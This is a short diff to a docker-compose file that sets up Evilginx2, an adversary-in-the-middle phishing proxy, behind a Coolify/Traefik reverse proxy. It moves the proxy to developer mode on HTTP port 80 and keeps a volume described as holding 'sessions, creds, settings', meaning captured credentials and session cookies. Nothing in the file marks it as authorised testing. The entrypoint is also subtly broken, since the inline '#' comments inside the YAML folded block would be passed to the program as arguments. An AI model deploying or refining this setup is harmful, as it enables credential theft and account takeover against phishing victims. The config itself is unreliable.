@@ -1,15 +1,31 @@
+version: "3.8"
+
 services:
   evilginx:
     image: warhorse/evilginx2:latest
     container_name: evilginx2
+
+    # Run Evilginx in developer mode, HTTP only on port 80
+    entrypoint: >
+      /bin/evilginx
+        -developer                     # keep internal DNS/TLS disabled
+        -p /phishlets
+        -c /config
+        -http-port 80
+        -https-port 0                  # disable HTTPS listener
+
     expose:
-      - "443"                    # internal port
+      - "80"                           # internal port Traefik will hit
+
     labels:
-      - coolify.port=443
-      - traefik.http.services.evilginx.loadbalancer.server.scheme=https
+      - coolify.port=80                # Coolify/Traefik forwards to port 80
+      # (no scheme=https label)
+
     volumes:
-      - ./phishlets:/phishlets
-      - config_data:/config
+      - ./phishlets:/phishlets         # phishlets under version control
+      - config_data:/config            # sessions, creds, settings
+
     restart: unless-stopped
+
 volumes:
   config_data:
